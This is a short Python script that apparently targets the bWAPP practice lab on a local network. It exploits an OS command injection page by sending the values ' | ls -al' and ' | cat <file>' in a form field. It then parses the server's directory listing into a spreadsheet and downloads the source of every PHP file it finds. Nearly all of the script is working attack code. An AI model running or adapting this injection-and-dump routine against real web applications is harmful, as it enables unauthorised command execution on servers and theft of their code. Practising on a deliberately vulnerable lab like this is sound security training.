import requests
from bs4 import BeautifulSoup
import sys
import io
import re
import pandas as pd

sys.stdout= io.TextIOWrapper(sys.stdout.detach(), encoding = 'utf-8')
sys.stderr = io.TextIOWrapper(sys.stderr.detach(), encoding = 'utf-8')

headers = {
    "Referrer": "http://192.168.131.130/bWAPP/commandi.php",
    "Cookie" : "PHPSESSID=68406a716f7aab16fc240fd4316b9227; security_level=0"
    
}
data = {
    "target" : " | ls -al",
    "form" : "submit"
}

response = requests.post("http://192.168.150.128/bWAPP/commandi.php", headers=headers, data=data)
soup = BeautifulSoup(response.content,"html.parser")

pattern = r'^[d-].*www-data.*$'

matches = re.findall(pattern, soup.get_text(),re.MULTILINE)

file_info_list = []
php_list = []

for match in matches:
    print("a")
    match = match.split()
    file_info = {"type" : 'd' if match[0][0] == 'd' else 'f',
                 "Permission" : match[0][1:],
                 "link" : match[1],
                 "Owner" : match[2],
                 "Group" : match[3],
                 "Size" : match[4],
                 "Time" : f"{match[5],match[6],match[7]}",
                 "Name" : match[8]}
    if match[8][-3:] in "php":
        php_list.append(match[8])
    file_info_list.append(file_info)

df = pd.DataFrame(file_info_list)

excel_file = f'bee.xlsx'
df.to_excel(excel_file, index=False)


for php in php_list:
    data = {
    "target" : " | cat "+php,
    "form" : "submit"
    }
    response = requests.post("http://192.168.150.128/bWAPP/commandi.php", headers=headers, data=data)

    soup = BeautifulSoup(response.content,"html.parser")

    php_text = soup.find_all('p')

    if php_text[1]:
        with open(f"./download_php/{php}", 'w',encoding='utf-8') as file:
            file.write(php_text[1].text)